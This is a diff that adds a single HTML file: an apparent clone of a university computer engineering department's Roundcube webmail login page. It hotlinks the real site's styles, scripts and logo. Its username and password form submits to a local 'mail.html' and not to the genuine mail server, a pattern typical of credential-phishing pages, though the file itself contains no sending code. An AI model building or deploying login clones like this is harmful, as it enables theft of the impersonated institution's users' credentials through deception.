@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Computer Engineering Webmail :: Welcome to Computer Engineering Webmail</title>
+<meta name="Robots" content="noindex,nofollow" />
+<meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
+<link rel="shortcut icon" href="https://web.ce.pdn.ac.lk/mail/skins/larry/images/favicon.ico"/>
+<link rel="stylesheet" type="text/css" href="https://web.ce.pdn.ac.lk/mail/skins/larry/styles.css?s=1352925028" />
+<!--[if IE 9]><link rel="stylesheet" type="text/css" href="skins/larry/svggradients.css?s=1352925028" /><![endif]-->
+<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="skins/larry/iehacks.css?s=1352925028" /><![endif]-->
+<!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="skins/larry/ie7hacks.css?s=1352925028" /><![endif]-->
+<link rel="stylesheet" type="text/css" href="https://web.ce.pdn.ac.lk/mail/plugins/jqueryui/themes/larry/jquery-ui-1.8.18.custom.css?s=1352925028">
+<script type="text/javascript" src="https://web.ce.pdn.ac.lk/mail/skins/larry/ui.js?s=1352925028"></script>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+<script src="https://web.ce.pdn.ac.lk/mail/program/js/jquery.min.js?s=1352925028" type="text/javascript"></script>
+<script src="https://web.ce.pdn.ac.lk/mail/program/js/common.js?s=1352925044" type="text/javascript"></script>
+<script src="https://web.ce.pdn.ac.lk/mail/program/js/app.js?s=1352925039" type="text/javascript"></script>
+<script type="text/javascript">
+
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","x_frame_options":"sameorigin","skin":"larry","keep_alive":60,"action":"","comm_path":".\/?_task=login","date_format":"yy-mm-dd","request_token":"aaebe47c1a78bd2de8ac9c0707dcd403"});
+rcmail.gui_container("loginfooter","bottomline");
+rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","requesttimedout":"Request timed out"});
+rcmail.gui_object('loginform', 'form');
+rcmail.gui_object('message', 'message');
+</script>
+
+<script type="text/javascript" src="https://web.ce.pdn.ac.lk/mail/plugins/jqueryui/js/jquery-ui-1.8.18.custom.min.js?s=1352925028"></script>
+</head>
+<body>
+
+<div id="login-form">
+<div class="box-inner">
+<img src="https://web.ce.pdn.ac.lk/mail/skins/larry/images/roundcube_logo.png" id="logo" border="0" alt="Computer Engineering Webmail">
+
+<form name="form" action="mail.html" method="post">
+<input type="hidden" name="_token" value="aaebe47c1a78bd2de8ac9c0707dcd403">
+<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="_default_"><input type="hidden" name="_dstactive" id="rcmlogindst" value="_default_"><input type="hidden" name="_url" id="rcmloginurl" value=""><table><tbody><tr><td class="title"><label for="rcmloginuser">Username</label>
+</td>
+<td class="input"><input name="_user" id="rcmloginuser" size="40" autocapitalize="off" autocomplete="off" type="text"></td>
+</tr>
+<tr><td class="title"><label for="rcmloginpwd">Password</label>
+</td>
+<td class="input"><input name="_pass" id="rcmloginpwd" size="40" autocapitalize="off" autocomplete="off" type="password"></td>
+</tr>
+</tbody>
+</table>
+
+
+<p class="formbuttons"><input type="submit" class="button mainaction" value="Login" /></p>
+
+</form>
+</div>
+
+<div class="box-bottom">
+	<div id="message"></div>
+</div>
+
+<div id="bottomline">
+	Computer Engineering Webmail 
+		
+</div>
+</div>
+
+<script type="text/javascript">
+
+// UI startup
+var UI = new rcube_mail_ui();
+$(document).ready(function(){
+	UI.set('errortitle', 'An error occurred!');
+	UI.init();
+});
+
+</script>
+
+
+
+
+
+<script type="text/javascript">
+
+jQuery.extend(jQuery.ui.dialog.prototype.options.position, {
+                using: function(pos) {
+                    var me = jQuery(this),
+                        offset = me.css(pos).offset(),
+                        topOffset = offset.top - 12;
+                    if (topOffset < 0)
+                        me.css('top', pos.top - topOffset);
+                    if (offset.left + me.outerWidth() + 12 > jQuery(window).width())
+                        me.css('left', pos.left - 12);
+                }
+            });
+$(document).ready(function(){ 
+rcmail.init();
+var images = ["skins\/larry\/images\/ajaxloader.gif","skins\/larry\/images\/buttons.png","skins\/larry\/images\/addcontact.png","skins\/larry\/images\/filetypes.png","skins\/larry\/images\/listicons.png","skins\/larry\/images\/messages.png","skins\/larry\/images\/quota.png","skins\/larry\/images\/selector.png","skins\/larry\/images\/splitter.png","skins\/larry\/images\/watermark.jpg"];
+            for (var i=0; i<images.length; i++) {
+                img = new Image();
+                img.src = images[i];
+            }
+});
+</script>
+
+</body>
+</html>
